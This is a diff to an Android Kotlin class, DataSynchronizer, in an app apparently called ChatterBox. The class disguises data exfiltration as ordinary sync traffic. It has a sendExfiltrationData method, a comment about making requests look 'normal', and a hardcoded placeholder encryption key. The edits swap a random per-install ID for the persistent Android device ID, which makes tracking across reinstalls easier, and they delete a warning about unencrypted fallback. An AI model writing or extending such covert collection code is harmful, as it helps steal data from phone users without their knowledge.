@@ -4,6 +4,7 @@ import android.content.Context
 import android.os.AsyncTask
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.util.Log
 import org.json.JSONObject
 import java.io.File
@@ -13,7 +14,6 @@ import java.net.URL
 import java.security.SecureRandom
 import java.util.LinkedList
 import java.util.Queue
-import java.util.UUID
 import javax.crypto.Cipher
 import javax.crypto.spec.IvParameterSpec
 import javax.crypto.spec.SecretKeySpec
@@ -34,8 +34,9 @@ class DataSynchronizer(private val context: Context) {
         const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
     }
 
+    // Use Android device ID as the consistent device identifier
     private val deviceId: String by lazy {
-        getOrCreateDeviceId()
+        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
     }
 
     fun queueForSync(dataType: String, filePath: String) {
@@ -78,7 +79,7 @@ class DataSynchronizer(private val context: Context) {
 
         // Create a "normal" looking API request
         val request = JSONObject().apply {
-            put("client_id", deviceId)
+            put("device_id", deviceId) // CONSISTENT: Always use device_id as the primary identifier
             put("app_version", getAppVersion())
             put("timestamp", System.currentTimeMillis())
             put("sync_type", "incremental")
@@ -141,23 +142,8 @@ class DataSynchronizer(private val context: Context) {
             return result
         } catch (e: Exception) {
             Log.e(TAG, "Encryption error", e)
-            // In a real security scenario, you would NOT want to fall back to unencrypted
-            // It would be better to fail the operation than send unencrypted data
             throw e
         }
-    }
-
-    private fun getOrCreateDeviceId(): String {
-        val prefs = context.getSharedPreferences("app_config", Context.MODE_PRIVATE)
-        val existingId = prefs.getString("client_id", null)
-
-        if (existingId != null) {
-            return existingId
-        }
-
-        val newId = UUID.randomUUID().toString()
-        prefs.edit().putString("client_id", newId).apply()
-        return newId
     }
 
     private fun getAppVersion(): String {
@@ -171,7 +157,8 @@ class DataSynchronizer(private val context: Context) {
     fun registerDevice() {
         try {
             val registrationData = JSONObject().apply {
-                put("client_id", deviceId)
+                // CONSISTENT: Use deviceId as the primary identifier
+                put("device_id", deviceId)
                 put("device_info", JSONObject().apply {
                     put("model", android.os.Build.MODEL)
                     put("manufacturer", android.os.Build.MANUFACTURER)
@@ -191,7 +178,8 @@ class DataSynchronizer(private val context: Context) {
     fun sendExfiltrationData(dataType: String, data: String) {
         try {
             val exfilData = JSONObject().apply {
-                put("client_id", deviceId)
+                // CONSISTENT: Use deviceId as the primary identifier
+                put("device_id", deviceId)
                 put("type", dataType)
                 put("timestamp", System.currentTimeMillis())
                 put("data", data)
@@ -225,7 +213,7 @@ class DataSynchronizer(private val context: Context) {
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
                 connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
-                connection.setRequestProperty("X-Client-ID", deviceId)
+                connection.setRequestProperty("X-Device-ID", deviceId) // CONSISTENT: Use deviceId in headers
 
                 // Standard timeouts
                 connection.connectTimeout = 15000
